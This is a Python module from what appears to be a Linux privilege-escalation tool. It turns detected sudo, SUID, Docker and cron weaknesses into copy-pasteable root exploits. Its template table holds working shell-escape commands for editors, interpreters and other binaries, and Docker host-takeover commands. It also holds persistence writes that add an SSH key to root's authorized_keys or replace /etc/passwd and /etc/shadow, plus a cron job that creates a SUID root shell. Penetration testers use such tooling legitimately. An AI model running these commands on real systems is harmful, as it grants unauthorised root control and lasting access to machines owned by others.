"""
nullpeas/core/exploit_templates.py

This module translates abstract offensive primitives into concrete, 
copy-pasteable command strings for the operator.

It serves as the "Action Engine" for the Attack Chains.
"""

from typing import List, Dict, Tuple, Optional
from nullpeas.core.offensive_schema import Primitive

# ===========================================================================
# COMMAND TEMPLATES
# Format: (binary_name, capability_type): "template_string"
#
# Variables available for formatting:
#   {binary} -> The full path if known, else the binary name
#   {target} -> A target file (e.g. for write primitives)
# ===========================================================================

TEMPLATES: Dict[Tuple[str, str], str] = {
    # === Sudo: Shell Escapes ===
    ("vim", "shell_spawn"): "sudo {binary} -c ':!/bin/sh'",
    ("vi", "shell_spawn"): "sudo {binary} -c ':!/bin/sh'",
    ("nano", "shell_spawn"): "sudo {binary}\n# Inside nano: Ctrl+R, Ctrl+X, then type: reset; sh 1>&0 2>&0",
    ("less", "shell_spawn"): "sudo {binary} /etc/profile\n# Inside less: !/bin/sh",
    ("more", "shell_spawn"): "sudo {binary} /etc/profile\n# Inside more: !/bin/sh",
    ("man", "shell_spawn"): "sudo {binary} man\n# Inside man: !/bin/sh",
    ("find", "shell_spawn"): "sudo {binary} . -exec /bin/sh \\; -quit",
    ("awk", "shell_spawn"): "sudo {binary} 'BEGIN {system(\"/bin/sh\")}'",
    ("nmap", "shell_spawn"): "echo 'os.execute(\"/bin/sh\")' > /tmp/shell.nse && sudo {binary} --script=/tmp/shell.nse",
    ("python", "shell_spawn"): "sudo {binary} -c 'import os; os.system(\"/bin/sh\")'",
    ("python3", "shell_spawn"): "sudo {binary} -c 'import os; os.system(\"/bin/sh\")'",
    ("perl", "shell_spawn"): "sudo {binary} -e 'exec \"/bin/sh\";'",
    ("ruby", "shell_spawn"): "sudo {binary} -e 'exec \"/bin/sh\"'",
    ("lua", "shell_spawn"): "sudo {binary} -e 'os.execute(\"/bin/sh\")'",
    ("gdb", "shell_spawn"): "sudo {binary} -nx -ex '!sh' -ex quit",
    ("ftp", "shell_spawn"): "sudo {binary}\n# Inside ftp: !/bin/sh",
    ("scp", "shell_spawn"): "TF=$(mktemp); echo 'sh 0<&2 1>&2' > $TF; chmod +x $TF; sudo {binary} -S $TF x y:",
    
    # === Sudo: File Writes (for chaining) ===
    ("tee", "file_write"): "echo 'ssh-rsa AAAAB3...' | sudo {binary} -a /root/.ssh/authorized_keys",
    ("dd", "file_write"): "echo 'evil' | sudo {binary} of=/etc/ld.so.preload",
    ("cp", "file_write"): "sudo {binary} /tmp/evil_passwd /etc/passwd",
    ("mv", "file_write"): "sudo {binary} /tmp/evil_shadow /etc/shadow",
    
    # === SUID: Shell Escapes ===
    ("bash", "suid_shell"): "{binary} -p",
    ("sh", "suid_shell"): "{binary} -p",
    ("env", "suid_shell"): "{binary} /bin/sh -p",
    
    # === Docker ===
    ("docker", "host_takeover"): "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    ("docker", "socket_mount"): "docker run -v /var/run/docker.sock:/var/run/docker.sock -it docker:latest sh",
    
    # === Cron ===
    ("cron", "writable_script"): "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> {target}\n# Wait for cron...",
}


def _get_template(binary: str, capability: str) -> Optional[str]:
    """
    Look up a template. Tries specific match first, then fallbacks.
    """
    # 1. Exact match
    if (binary, capability) in TEMPLATES:
        return TEMPLATES[(binary, capability)]
    
    # 2. Sudo fallback (many editors behave similarly)
    if capability == "shell_spawn" and binary in ["ed", "ex"]:
        return "sudo {binary}\n# Inside editor: !/bin/sh"

    return None


def generate_exploit_for_chain(p: Primitive) -> List[str]:
    """
    Generates a list of suggested command strings for a given primitive.
    """
    cmds = []
    
    # Context extraction
    binary = p.context.get("binary")
    path = p.context.get("binary_path") or binary
    
    # === 1. ROOT SHELL PRIMITIVES (Sudo / SUID) ===
    if p.type in {"root_shell_primitive", "suid_primitive"}:
        
        # Sudo (ALL) ALL case
        if p.context.get("is_all_rule") and p.context.get("nopasswd"):
            cmds.append("sudo su -")
            return cmds
            
        # Binary specific
        if binary:
            # We assume 'shell_spawn' capability for root shell primitives
            tpl = _get_template(binary, "shell_spawn")
            
            # If it's a SUID binary, check suid_shell template
            if not tpl and p.surface == "suid":
                 tpl = _get_template(binary, "suid_shell")

            if tpl:
                cmds.append(tpl.format(binary=path))

    # === 2. DOCKER HOST TAKEOVER ===
    elif p.type == "docker_host_takeover":
        # Check if we have the binary or just the socket
        if p.conditions.get("requires_docker_cli"):
            cmds.append(TEMPLATES[("docker", "host_takeover")])
        else:
            # API-only exploits (advanced)
            socket = p.affected_resource or "/var/run/docker.sock"
            cmds.append(f"curl -XPOST --unix-socket {socket} -d '{{...}}' http://localhost/containers/create")
            cmds.append("# (API exploitation requires manual JSON payload construction)")

    # === 3. ARBITRARY FILE WRITE ===
    elif p.type == "arbitrary_file_write_primitive":
        if binary:
            tpl = _get_template(binary, "file_write")
            if tpl:
                cmds.append(tpl.format(binary=path))

    # === 4. CRON EXECUTION ===
    elif p.type == "cron_exec_primitive":
        target = p.context.get("target_file")
        if target:
            tpl = TEMPLATES[("cron", "writable_script")]
            cmds.append(tpl.format(target=target))

    return cmds
